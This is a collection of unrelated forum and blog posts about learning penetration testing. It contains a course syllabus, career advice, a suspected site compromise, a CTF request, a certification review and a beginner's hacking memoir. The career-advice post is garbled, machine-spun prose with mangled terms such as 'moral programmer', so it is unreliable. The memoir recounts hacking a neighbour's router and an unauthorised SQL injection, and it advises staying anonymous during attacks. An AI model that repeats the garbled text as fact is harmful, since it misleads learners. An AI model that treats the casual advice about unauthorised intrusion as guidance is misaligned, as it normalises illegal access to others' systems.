scripting, which will be essential to our future endeavors as penetration testers. &amp;nbsp; **6 - Hacking in Five Steps** - This lesson will introduce the five key components of hacking: reconnaissance, enumeration, exploitation, maintaining access, and covering tracks. These five key concepts will be built upon as we progress, with at least one part dedicated to each component. &amp;nbsp; **EXTERNAL PENTESTING** &amp;nbsp; **7 - The Art of Reconnaissance** - This lesson will discuss reconnaissance in depth and cover common tools used in the process. Some of the tools that will be covered are the OSINT Framework, SET, theHarvester, Bluto, Google Dorks, and Shodan. More tools will likely be added as the lesson is written. &amp;nbsp; **8 - Scanning Tactics** - This lesson will cover common tools in-depth that are used for port scanning including Nmap, Nessus, and Metasploit. The section will introduce readers to using a wide toolset for scanning on penetration tests and provide a deeper understanding of what is going on behind the scenes. For example, the importance of TCP vs UDP scanning, the three-way TCP handshake, stealth scanning, and various Nmap switches. It will also provide the first introduction to Metasploit and its usage, which will be built upon throughout the course. &amp;nbsp; **9 - Enumeration for the win** - The intent of this lesson is to provide an overview of basic enumeration tactics and then dive deep into specific tools used for common ports found in penetration testing. For example, if we find port 80 open on a scan (HTTP), we will likely want to know what service is running and enumerate that service for potential exploits at a high level. At a deep level, we will want to explore the app with tools such as Nikto, Dirbuster/Dirb, and Burp Suite to really enumerate the app where tools like Nmap and Nessus fail to go deep enough. &amp;nbsp; **10 - Gaining a Shell with Metasploit** - This lesson will cover how to use Metasploit to gain shell access to a vulnerable machine. This builds upon the introductory Metasploit from section 8 as we move from the auxiliary/scanning portion of Metasploit to the exploit portion. This lesson is important as Metasploit is a common tool in nearly every penetration testers toolkit, especially at the beginner level. &amp;nbsp; **11 - Compiling Exploits** - This lesson will add to exploitation learned in section 9, except that the exploitation is now done manually, without Metasploit. This will teach the reader how to safely download exploits from the web, generate shellcode, compile the exploit if necessary, and execute it against a vulnerable machine. &amp;nbsp; **12 - When Nothing Else Works** - The previous two lessons in focus on having an exploit readily available that will provide shell access. As a penetration tester, gaining shell from an exploit does not happen most of the time. Sometimes, we have to get creative. This may include using social engineering and password spraying Outlook/other web applications. The section also focuses on the failing mentality and how it is okay to not break in on every external. Lastly, it will cover some common non-critical findings/things to look for that can be added to a report, such as default web pages, public RDP, public SNMP, etc. &amp;nbsp; **INTERNAL PENTESTING** &amp;nbsp; **13 - Hello Enumeration, My Old Friend** - This lesson will cover post-exploitation enumeration. In other words, weve gained access to a single machine in a network, now what are we looking for? The chapter will focus heavily on Active Directory enumeration concepts as that is the likely environment a pentester will encounter in the real world. However, lessons will be provided for non-Active Directory environments as well. Important tools that will be discussed are nbtscan, nslookup, nbtstat, net commands, PowerShell commands, and more. &amp;nbsp; **14 - Active Directory Exploitation** - This lesson focuses on the recognition of vulnerabilities and exploitation tactics in an internal Active Directory environment. Attacks that will be introduced include: LLMNR poisoning/hash cracking, SMB hash relaying, pass the hash, token impersonation, kerberoasting, GPP/c-password attacks, and PowerShell attacks. More attacks will likely be added as the lesson is written, but the most common have been provided. &amp;nbsp; **15 - Exploiting Non-Active Directory Environments** - This lesson will discuss the exploitation of devices in a non-Active Directory environment. Students will learn how to identify critical servers, conduct local password attacks, and learn outside-the-box strategies for attacking. Examples will come from previous penetration tests, such as exploiting default credentials on local printers and dumping stored credentials to gain access to critical servers. &amp;nbsp; **16 - Maintaining Access / Pivoting / Cleanup** - This lesson will discuss methods of maintaining access on a network, pivoting into other networks, and how to properly clean up as you exit a network. &amp;nbsp; **17 - Report Writing** - This lesson will cover the importance of report writing in penetration testing and walk through what should be included in a penetration test report. A demo penetration test report will be provided that will cover many of the findings that we have discussed in prior chapters. This will provide students with a clear understanding of what is expected on a penetration test report and how to write on effectively. &amp;nbsp; That's it for now. I anticipate doing one Twitch stream a week, starting Wednesday of next week and that most lessons can be completed in a single stream. However, some of the meatier items may take multiple weeks to get through. My goal is also to provide reading and homework for students so that they pull in more information from much smarter people than myself. To do this, I've set up a mailing list on my website that you can sign up for. Now, on to the links: &amp;nbsp; **SOCIAL MEDIA** &amp;nbsp; Website: URL (Sign up for the mailing list here if interested) Twitch: URL Twitter: URL YouTube: URL LinkedIn: URL &amp;nbsp; Please let me know if you have any questions about the course and I will do my best to answer them / add them to an FAQ Edit. Thanks everyone for being so awesome! "

For one thing, allows simply concur that truism 'a Vocation in Cybersecurity' is somewhat similar to stating 'a Profession in Saving money', for example it's an umbrella term that fuses many specialties inside the business. In Cybersecurity we can, for instance, talk about computerized legal sciences as a profession, or malware/programming distinguishing, evaluating, pentesting, social designing and numerous other vocation tracks. Every one of these sub-classes inside cybersecurity merits a different blog entry, at the same time, for the motivations behind this piece, how about we center around some essential nonexclusive prerequisites that everybody needs before setting out on a fruitful profession in IT Security.

Nobody is an island and nobody is brought into the world with all the vital abilities. Period.OK, so you have zero understanding and constrained aptitudes my recommendation in this example is that you show yourself some total essentials. How about we kick this gathering off. **1. What is hacking?** \--&gt;[URL Hacking is distinguishing shortcoming and vulnerabilities of some framework and obtaining entrance with it. Programmer gets unapproved access by focusing on framework while moral programmer have an official authorization in a legal and genuine way to survey the security stance of an objective system(s). There are a few sorts of programmers, a touch of ""phrasing"". White hat  ethical programmer. Dark hat  classical programmer, get unapproved get to. Dark hat  a individual who gets unapproved get to yet uncovers the shortcomings to the organization. Content kiddie  a individual with no specialized abilities simply utilized pre-made apparatuses. Hacktivist  a individual who hacks for some thought and abandons a few messages. For instance strike against copyright. As a matter of fact, an objective of moral hacking is to uncover the framework shortcomings and vulnerabilities for an organization to fix them. Moral programmer records all that he did. **2. Aptitudes required to wind up a moral programmer.** As a matter of first importance to be a Pentester you should be happy to consistently adapt new things on the fly as well as fast at home. Furthermore, you need a solid fundamental comprehension of something like one coding/scripting language just as a comprehension of System and Web Security. So here are a few stages in the event that you need to begin from now Figure out how To Code (Programming). Comprehend essential ideas of Working Framework Basics of Systems administration and Security Markup and the same number of advancements as you can! **3. What Stage To Code In:-** That relies upon what stage you'll be chipping away at. For web applications, I propose you learn HTML, PHP, JSP, and ASP. For portable applications, attempt Java (Android), Quick (iOS), C# (Windows Telephone). For work area based programming attempt Java, C#, C++. I might want to prescribe Python also on the grounds that its a broadly useful language and getting progressively famous these days because of its versatility. Be that as it may, what truly is vital for each programming language is to gain proficiency with the basics of programming, ideas like the information types, the variable control all through the program at the OS level to the utilization of subroutines otherwise known as capacities, etc. In the event that you gain proficiency with these, it's practically the equivalent for each programming language aside from some sentence structure changes. **Pro Tips:-** **How to Be a Hacker** \--&gt;[URL To be a specialist at any programming language, comprehend the OS level tasks of that language (fluctuates in various compilers) or adapt low level computing construct to be increasingly summed up Try not to get your expectations high on the off chance that you can't accomplish results in a limited ability to focus time. I favor the ""Miyagi"" style of learning. So keep yourself spurred for what comes straightaway. Keep in mind the intensity of system and framework overseers. They can make you their \*hypothetical\* slave in a corporate infosec condition  Assets To Begin: I might want to share a few assets that I discovered best in gaining starting with no outside help. A portion of the focuses to be noted: By a Self-Student: Why? Since without it you won't gain from things you experience, you won't probably take care of your issues. Teach your self on consistent schedule: read articles, reviews, recordings or slides to instruct yourself Know your objective, before continuing make a point to know your objective. Put the vast majority of your time in distinguishing your objective recognizing the administrations the objective employments. Guide the objective: show signs of improvement perspective on the objective's foundation so as to show signs of improvement comprehension of what to target.

Then I checked the latest google update. On their blog it says that the newest one is 68.x.x dev channel. How can then the current release be 71.x.x if by default I'm not opted into dev or beta versions of the application And then the weird link on inspect element. Definitely looks made up. The only 2 pages I opened in my current chrome session are youtube and a shoe site a friend sent to me URL URL It is very likely that my country's shoe site might have been compromised since it's not really high tech. I have downloaded the file and didn't run it, if someone wants I can upload it. So in the end I pressed F5 and the page disappeared, only showing the shoe page on the same link.

Throughout my time being president of this club and giving presentations is that it is very difficult to do follow along activities related to cybersecurity due to the skill differences in the students and the nature of the field. That being said at the end of the day when it comes to cybersecurity the first thing students jump to is penetration testing/hacking. This is what generates initial interest and the business major in me realizes this is how I grab an audience. So to the point of this post, I was curious to see if anyone had any recommendations for a CTF VM that would be a good intro level yet challenging VM that would let students learn new things as well as feel accomplished. Some of the VM's I have seen require reverse shells and ultimately screwing with the original VM config. In order to streamline the presentation I will be hosting the CTF VM on a computer then using a router to create a LAN that the students can connect to and simply just attack the box rather than having to set up their own pentest lab on their computers. This also means though that to complete the challenge they have to be able to complete the steps. I don't want the success of one student to hamper the possibility of success for another student. With that being said I am open to any other ideas for a cybersecurity presentation. Usually at our general body meetings for the clubs we talk about major issues and dissect some major breaches and look at some basic tool usage. I want to make this fun and interactive without having too much overhead on the students. Any help would be greatly appreciated.

Maybe if I had been able to mimic their choices I would have arrived there, too. Finally, my eye fell onto an unknown certification: **eLearnSecurity Certified Professional Penetration Tester (eCPPT)**. Never heard of it! I found out a colleague of mine had already completed it and strongly suggested me to try. Buzzwords like practical, labs, hands-on were still echoing in my mind. So, I bought it. No trials, no reviews, just faith in work relationships, the foundation to become Security professionals. My impressions in brief: - **CHEAP:** I could afford it. Thats it! InfoSec certifications usually assume your organization would pay for them, but this is not the case and I think trade-off cost-benefits is really worth a try. - **EXHAUSTIVE:** The course includes everything you need to start your Cybersecurity career. Divided into 5 modules (Web, Network, System, Metasploit and WiFi), it offers PDFs, videos, codes and any kind of additional material to ease the learning process as much as possible. It felt like owning a personal library always available and ready to be consulted. Additionally, some of provided knowledges (such as Shellcoding or Buffer Overflow) are totally enabling to other Security advanced certifications and topics. - **SELF-SUFFICIENT:** No particular previous knowledge is required. The course does not take anything for granted and effectively explain all requirements needed to completely understand discussed topics with an impressive level of detail. The overall feeling is that nothing is there for no reason. - **PRACTICAL:** Labs, labs, labs and labs again. Paper-Security is not effective if not put into practice. What did Beckett say? Ever tried. Ever failed. No matter. Try Again. Fail again. Fail better. - **APPEALING:** The course offers a perfect balance between text and graphics, in the idea that visual representation is a better way to pin concepts than hundreds of words. Between the infinity of tools and certifications, I will always remember eCPPT course as the first true step I have taken in my professional career. What really gave me the self-confidence to try mastering this complex and deep subject. Security is all about knowledge and experience. Mostly important, security is a method where everyone can give a real contribution in his own way. No shortcuts. No definite roads. Only knowledge and confidence. Do not take anything for granted; deepen, contaminate, learn, trust in yourself, with a clear idea of the direction you intend to take. It wont be easy. You can decide to give up or try. Your choice."

It all started in London when I met my roomate Charlie, an english dude who introduced me to cyber security. He once showed me how to hack our neighbor's router, and damn, it looked like in the movies ! At this time my computer skills were close to 0, so I was very impressed when I saw him typing codes on his debian console , even if I couldn't understand a sh*t about what he was doing (today I know he was just running the aircrack suite). So I started as a lamer, I know that the hacking community despise lamers, but when you don't know anything about cybersecurity, this is where you start. I first discovered about online anonymity, being able to change its IP or MAC address was already a big thing to me. Then I started to download those crappy-ful-of-viruses programs that are polluting the internet, and that are supposed to hack stuffs, this is how I performed my first SQL injection (it worked !) without having any understanding of what I was doing. The fact is : getting all those tables and columns freaked me out, I panicked and shut down everything. A few month later I wanted to get into this world again, and discovered linux, I gathered informations about different distros, and obviously I chose Kali, designed for pentesting. It took me approximately 1 week to run it proprely on dual-boot and to understand how to use the command prompt. It was clear : Kali was way too complicated for a noob like me, but it made me discover a few tools that I now properly use (nmap, aircrack, armitage &amp; metasploit...). A few month goes by again, and I replaced my Kali with Ubuntu, way more user-friendly, and started to learn before doing. That's how I became a script-kiddie. I knew how to use simple commands of Nmap, SQLmap, Wifite, started to understand Wireshark, Macchanger.... Now, 2 years later I am far of being an experienced hacker, but I can still do more with a computer than I guess 80% of the population, and I now know how hacking learning works : every man for itself ! You will find tutos on the internet, but you will ALWAYS have a trouble if you're following it without understanding what you're doing. I also know that this learning process is long as f***, and that it demands a lot of personal commitment. To all hackers wannabe here : it is almost impossible to become a really good hacker without studying websec for a few years in an academic environment. Today, I'm following courses on Cybrary.it, I usually watch 5videos/day and take notes, like a proper student. But it took me almost 2 years to understand that doing without knowing is completely useless. To all newbies : UNDERSTAND BEFORE DOING, don't be in a rush, take time to learn : try, fail, retry, fail again, understand why you failed, fix it, try again, fail for another reason, learn, fix, try again, and succeed. Today I can't consider myself as a hacker, but I am proud of what I've achieved and now have pretty good skills in computing in general and websec. But the thing I am the most proud of is : all of this I did it by myself, nobody ever helped me, I just gathered tons and tons of brute informations and learned a lot. To conclude, here is some advices from motivated hacker wannabe : -Install Linux (start with a friendly-user distro like Ubuntu, and then move to Debian, Kali...) -Learn on websites like Cyrbray.it / Offensivesecurity... (get OSCP if you can afford it) -Practice on websites like Hackthis.co.uk, newbiecontest.com, OWASP... -Learn languages (Python, C &amp; C++, HTML, PHP...) -Don't perform an attack unless you're 99% sure it will succeed -Remain anonymous -Don't become arrogant and big-headed because you just know how to hack a wifi hotspot -Don't get discouraged too easily, you will fail a 100 times to succed once. And never forget that all hackers were once newbies, and that it took years before they become efficient. Also remember that hacking something without having any authorization is illegal, and that you might get sued for it. And watch Mr.Robot because it's a fucking good serie"
